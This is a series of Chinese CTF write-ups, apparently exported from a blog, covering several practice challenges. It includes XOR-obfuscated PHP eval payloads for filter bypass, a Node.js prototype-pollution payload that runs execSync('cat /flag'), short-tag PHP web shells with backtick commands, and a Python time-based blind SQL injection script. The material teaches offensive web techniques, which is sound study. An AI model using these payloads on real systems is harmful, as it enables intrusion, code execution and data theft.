<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正则进行匹配过滤，匹配00到空格()的字符，0到9的数字、<code>&quot;$&amp;.,|[&#123;_defgops</code>以及DEL（7f）字符。如果你提交的字符串出现上述字符，die。第二个if表示我们提交的字符串一共不能出现多于13种不同的字符<br>使用此网站可以进行正则匹配的调试<br><a href="https://regex101.com/">https://regex101.com/</a><br>所以它允许出现的字符可以如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!#%()*+-&#x2F;:;&lt;&#x3D;&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~</span><br></pre></td></tr></table></figure>

<p>我们后面的eval肯定是要执行函数的，所以我们可以fuzz一下哪些函数没被过滤，从而来看看有没有实现rce的可能,用php写个脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>,$arr))<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">if</span>(strlen(count_chars(strtolower($arr),<span class="number">0x3</span>))&gt;<span class="number">0xd</span>)<span class="keyword">continue</span>;</span><br><span class="line">	var_dump($arr.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是得到的函数却和读取文件啥的没有关系–，所以继续往下看看<br>其实以前也做过很多这种类似题特征是<br>1.过滤了很多字符<br>2.有些运算字符没有被过滤<br>那么这就意味着我们可以通过运算来取字符，比如说^运算然后去构造我们需要的字符<br>payloadtest:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>^%ff%ff%ff%ff%ff%ff%ff)();<span class="comment">//分号和括号是因为这个要放到eval里面执行，是必不可少的语法要求</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725220736.png" alt="image-20210725220736235" style="zoom:67%;">

<p>接下来看看这个配置里面有什么能用的信息不<br>首先disable_function中的函数有很多都被禁了，然后它可以访问的目录也只限制在/html目录下，那么根据以往的经验，大概是要scandir等函数看一下当前目录下的内容了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221932.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221933.png" alt="img" style="zoom:67%;"><br>我们构造一下语句然后去找一下字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(&#39;.&#39;));</span><br></pre></td></tr></table></figure>

<p>还是之前的那个脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">find &#x3D; [&#39;p&#39;,&#39;r&#39;,&#39;i&#39;,&#39;_&#39;,&#39;n&#39;,&#39;t&#39;,&#39;s&#39;,&#39;c&#39;,&#39;a&#39;,&#39;d&#39;,&#39;r&#39;,&#39;.&#39;]</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    for j in range(0,256):</span><br><span class="line">        result&#x3D;chr(i^j)</span><br><span class="line">        if(result in find):</span><br><span class="line">            a&#x3D; i.to_bytes(1,byteorder&#x3D;&#39;little&#39;)</span><br><span class="line">            b&#x3D; j.to_bytes(1,byteorder&#x3D;&#39;little&#39;)</span><br><span class="line">            #print(a,b)</span><br><span class="line">            a&#x3D; urllib.parse.quote(a)</span><br><span class="line">            b&#x3D; urllib.parse.quote(b)</span><br><span class="line">            print(&quot;%s:%s^%s&quot;%(result,a,b))</span><br></pre></td></tr></table></figure>

<p>但是这样运算出来的字符我们随便选取就会大于十三个了，要绕过这个，我们就要想想看如何缩减？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>其实运用一种套娃的思想即可，这些字符里面的字符肯定可以由其他字符再异或构成的，所以我们这里就将所有异或字符先列出，想在上面的代码进行改编一下，直接一步到位<br>但是我发现似乎不太行。还不如我直接取完再送进去对每个字符重新异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>]  <span class="comment"># Original chars,11 total</span></span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure>

<p>对结果进行整理一下，发现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726003819.png" alt="img" style="zoom:67%;">
拿到flag所在文件。最后构造一下，因为flag在最后一个位置，所以可以直接用end进行获取

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>GYCTF2020-Ez_Express</title>
    <url>/2021/07/22/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看了一下有注册有登录，于是试了一下<a href="http://www.zip发现有源码泄露：">www.zip发现有源码泄露：</a><br>审计的是thinkphp6.0，看半天看不出个所以然，于是看wp了</p>
<h2 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h2><p>原型链特性：<br>当我们调用一个对象的某属性时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.对象（obj）中寻找这一属性</span><br><span class="line">2.如果找不到，则在obj.proto中寻找属性</span><br><span class="line">3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性</span><br></pre></td></tr></table></figure>

<p>以上机制被称为js的prototype的继承链。和node.js沙盒逃逸的原理似乎是一样的<br><strong>举例：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure>

<p><strong>理解：</strong><br>Foo是一个类，prototype是Foo的属性，Foo中所有的实例化后对象都将拥有这个属性，我们在prototype属性中定义了一个方法show，接下来所有实例化后的对象如foo都将直接拥有foo方法。<br><strong>原型链污染定义</strong>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染</span><br></pre></td></tr></table></figure>

<p><strong>例：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo=&#123;<span class="attr">bar</span>:<span class="number">1</span>&#125;<span class="comment">//foo是一个对象</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)<span class="comment">//foo.bar此时为1</span></span><br><span class="line">foo.__proto__.bar=<span class="number">2</span><span class="comment">//foo的原型设一个bar值为2</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)<span class="comment">//输出为1，因为foo的bar已经为1</span></span><br><span class="line"><span class="keyword">let</span> zoo=&#123;&#125;<span class="comment">//设zoo的对象为空</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)<span class="comment">//这个时候zoo的bar就为2，现在每个原型都有个属性bar值为2</span></span><br></pre></td></tr></table></figure>

<h3 id="哪些情况下原型链会被污染？"><a href="#哪些情况下原型链会被污染？" class="headerlink" title="哪些情况下原型链会被污染？"></a>哪些情况下原型链会被污染？</h3><p>在含有能够控制数组（对象）的“键名”的操作即可，一般是以出现：<br>merge和clone对象</p>
<h4 id="不安全的对象递归合并"><a href="#不安全的对象递归合并" class="headerlink" title="不安全的对象递归合并"></a>不安全的对象递归合并</h4><p>以merge,因为merge执行的就是递归，为例，先构造一个简单的merge函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">target, source</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Iterate through `source` properties and if an `Object` set property to merge of `target` and `source` properties</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(source)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="built_in">Object</span>) <span class="built_in">Object</span>.assign(source[key], merge(target[key], source[key]))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Join `target` and modified `source`</span></span><br><span class="line">  <span class="built_in">Object</span>.assign(target || &#123;&#125;, source)</span><br><span class="line">  <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age,gender</span>)</span>&#123;<span class="comment">//构造一个person类</span></span><br><span class="line">	<span class="built_in">this</span>.name=name;</span><br><span class="line">	<span class="built_in">this</span>.age=age;</span><br><span class="line">	<span class="built_in">this</span>.gender=gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> newperson=<span class="keyword">new</span> Person(<span class="string">&quot;test1&quot;</span>,<span class="number">22</span>,<span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> job=<span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;&#x27;</span>);<span class="comment">//新建一个job对象</span></span><br><span class="line">merge(newperson,job);<span class="comment">//这个job对象有用title、contry、__proto__属性，并对其进行赋值</span></span><br><span class="line"><span class="built_in">console</span>.log(newperson);</span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype);<span class="comment">//此时per的原型已经被改变为x=1</span></span><br></pre></td></tr></table></figure>

<p>这里解释一下，merge将这几个键值作为一个属性合并到newperson这个对象中了，merge函数执行的其实可以认为是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Person.job.title&#x3D;......</span><br><span class="line">Person.job.__proto__&#x3D;....</span><br></pre></td></tr></table></figure>

<p>这个时候job的原型是Person，所以Person的值就发生了改变。</p>
<h4 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h4><p>有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。通常这些函数类似以下的形式：theFunction(object, path, value)，将对象object的指定路径path上的属性值修改为value。如果攻击者可以控制路径path的值，那么将路径设置为_proto_.theValue，运行theFunction函数之后就有可能将theValue属性注入到object的原型中。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="http://www.zip下载源码：">www.zip下载源码：</a></p>
<p>然后开始审计</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br></pre></td></tr></table></figure>

<p>在index.js找到merge和clone，接下来看看有哪里调用了他们，发现是在/action这里，并且需要user为admin</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>那么就需要先登录，在登录这列发现</p>
<p>**其中<code> &#39;user&#39;:req.body.userid.toUpperCase()</code> 这一句中<code>toUpperCase()</code>函数是为了将字符串中的小写字符转换成大写，但因为javascript的特性，函数存在分险（下图），所以假如我们传入<code>admın</code>的话，经过<code>toUpperCase()</code>的处理后，会变成<code>ADMIN</code>**关于node-js题目的尝试/9.png)</p>
<blockquote>
<p>在javascript中有几个特殊的字符需要记录一下</p>
<p>对于toUpperCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>对于toLowerCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以我们可以注册用户名为<code>admın</code>然后进行登录即可，接下来在去可以污染的参数那边看看该如何构造payload<br>首先可以可以看到clone在login那边对body进行操作，那么我们的原型链传入的值也应该在那里</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>再往下看,我们outputoFunctionName被渲染了，那么其实思路就很明确了，通过clone原型链污染outputoFunctionName，导致其值被改变，渲染拿到flag</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>: <span class="string">&quot;test;clearTimeout.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag &gt; /app/public/reader&#x27;).toString();var test1&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>从语法的角度解释一下这个payload：我们通过污染outputFunctionName的原型，通过constructor访问其向上原型链，获得主环境的function，2然后通过(‘return process’)()获得主环境process变量，通过process.mainModule.require导入child_process模块，实现命令执行,最后将flag输出至/reader中，由于这个outputFunctionName是未定义的，所以我们后面访问它，就会直接赋值为我们定义的这些属性（和上面的原理是一样的）</p>
<p>来自：<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724161343.png" alt="img" style="zoom:67%;">
要记得吧传输的内容格式改为json的，然后登陆/info让其被渲染，然后再登录/reader将flag下载下来即可

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>由于语法还是有很多不懂，但还好学沙盒逃逸的时候有掌握一点语法，所以原理还是可以看懂的，但是构造语句还是不太行<br>总结一下js的原型链污染<br>1.寻找merge或者clone函数<br>2.寻找使用这两个函数的对象，查看其是否可控，能渲染</p>
<p><a href="https://www.freebuf.com/articles/web/275619.html">https://www.freebuf.com/articles/web/275619.html</a></p>
<p><a href="https://www.cnblogs.com/LEOGG321/p/13448463.html">https://www.cnblogs.com/LEOGG321/p/13448463.html</a></p>
<p>js的字符：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>buu24</title>
    <url>/2021/07/26/buu24/</url>
    <content><![CDATA[<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><p>首先是check函数过滤了一些字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果传入的是数组，那么就会进行foreach再对其键值进行check函数的过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过waf后的内容将会被传入index.php中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case &#39;upload&#39;:</span><br><span class="line">       $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">       waf($data);</span><br><span class="line">       file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br></pre></td></tr></table></figure>

<p>现在需要想的就是如何构造shell，过滤了php我们可以使用短标签进行绕过，过滤了 过滤了php我们可以使用.进行连接，过滤了空格，我们可以使用括号进行绕过，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?action=upload&amp;data=<span class="meta">&lt;?=</span>(ph.pinfo)()<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过成功<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726101524.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?action=upload&amp;data=<span class="meta">&lt;?=</span>`ls%<span class="number">09</span>/`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726101825.png" alt="img" style="zoom:67%;">
接下来就是cat它就好了

<h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>测试了一下 发现是堆叠注入，但是没有输出回显信息，也不符合布尔盲注的条件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726115536.png" alt="img" style="zoom:67%;"></p>
<p>那就要考虑一下时间盲注了，接下来构造一下语句,尝试了一下select sleep(5)，发现没有反应，猜测存在过滤，堆叠注入的绕过有一个预处理，可以采取使用concat连接的方式进行绕过<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726153101.png" alt="img" style="zoom:67%;"></p>
<p>但是由于不确定都过滤了那些内容，虽然可以使用延迟进行fuzz，但是有点麻烦，可以直接采用十六进制转码的形式进行绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#题目地址</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://5c6e0550-a9af-461f-8eda-50bc9d0086f0.node4.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.format(str_to_hex(payload.format(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([hex(ord(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这个是网上大神的脚本，我的好像出了点问题，没跑出来–得到glzjin_wants_a_girl_friend.zip里面是源码，接下来审计一下：<br>打开controllers进行审计，可以发现basecontrollers中，有文件包含，那么我看看这个viewData是用extract() 函数从数组中将变量导入到当前的符号表。如果可以控制这个viewdata，那么就可以实现变量覆盖了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 加载视图文件</span></span><br><span class="line"><span class="comment">	 * viewName 视图名称</span></span><br><span class="line"><span class="comment">	 * viewData 视图分配数据</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">private</span> $viewPath;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params">$viewName =<span class="string">&#x27;&#x27;</span>, $viewData = []</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			extract($viewData);</span><br><span class="line">			<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这个load方法只在user里面看到，并且listDAT是有request获得的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210727110533.png" alt="img" style="zoom:50%;"></p>
